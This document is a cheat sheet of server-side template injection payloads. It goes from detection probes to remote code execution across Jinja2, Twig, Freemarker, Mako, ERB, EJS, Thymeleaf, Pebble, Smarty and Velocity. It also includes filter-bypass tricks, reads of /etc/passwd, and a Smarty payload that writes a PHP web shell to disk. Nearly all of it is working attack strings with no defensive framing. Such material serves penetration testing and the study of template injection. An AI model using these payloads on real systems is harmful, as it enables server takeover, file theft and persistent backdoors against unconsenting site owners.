# SSTI to RCE — Attack Chain

## Detection

```
# Test payloads (try all):
{{7*7}}        → 49 = Jinja2, Twig, or similar
${7*7}         → 49 = Freemarker, Mako, EL
#{7*7}         → 49 = Thymeleaf, Ruby ERB
<%= 7*7 %>     → 49 = ERB (Ruby), EJS (Node.js)
{{7*'7'}}      → 7777777 = Jinja2 (string multiplication)
{{7*'7'}}      → 49 = Twig (arithmetic)

# Decision tree:
# {{7*'7'}} → 7777777 → Jinja2
# {{7*'7'}} → 49 → Twig
# ${7*7} → 49 → check ${class.forName('java.lang.Runtime')} → Freemarker/EL
# <%= 7*7 %> → 49 → ERB or EJS
```

## Jinja2 (Python / Flask)

### Direct RCE
```python
# Via config object (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via MRO chain (universal)
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen or os._wrap_close in the list (index varies)
# Then: {{''.__class__.__mro__[1].__subclasses__()[IDX]('id',shell=True,stdout=-1).communicate()}}
```

### Filter Bypass
```python
# Dot notation blocked → use [] or |attr()
{{config['__class__']}}
{{config|attr('__class__')}}

# Underscore blocked → hex/unicode
{{config["\x5f\x5fclass\x5f\x5f"]}}
{{config["\u005f\u005fclass\u005f\u005f"]}}

# Quotes blocked → use request or chr()
{{config[request.args.a]}}  # ?a=__class__
{{().__class__.__bases__[0].__subclasses__()[IDX](()|attr(request.args.cmd))}}

# String concat
{%set a='__cla'%}{%set b='ss__'%}{{config[a~b]}}

# Self object (Jinja2 internal)
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## Twig (PHP)

### Twig 1.x
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### Twig 2.x / 3.x
```php
# _self.env deprecated — use filter/function injection
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|sort('system')}}

# File read
{{'/etc/passwd'|file_excerpt(1,-1)}}

# If sandbox is enabled, try:
{{app.request.server.get('DOCUMENT_ROOT')}}
```

## Freemarker (Java)

```java
# Direct execution
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# File read
<#assign is=object?api.class.getResourceAsStream("/etc/passwd")>
${is}

# Class loading
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign cl=classloader.loadClass("java.lang.Runtime")>
<#assign rt=cl.getMethod("getRuntime").invoke(null)>
${rt.exec("id")}
```

## Mako (Python)

```python
# Direct Python execution
${__import__('os').popen('id').read()}

# Code block
<%
import os
os.system('id')
%>

# Module access
${self.module.cache.util.os.system('id')}
```

## ERB (Ruby)

```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read() %>
<%= require 'open3'; Open3.capture2("id")[0] %>
```

## EJS (Node.js)

```javascript
<%= process.mainModule.require('child_process').execSync('id').toString() %>

// Prototype pollution → SSTI in EJS:
// If you can set: Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');//"
```

## Thymeleaf (Java / Spring)

```java
// URL-based injection (Spring view name)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// Expression: ${...}
${T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})}

// SpringEL
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

## Pebble (Java)

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 'UTF-8') }}
```

## Smarty (PHP)

```php
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
```

## Velocity (Java)

```java
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```
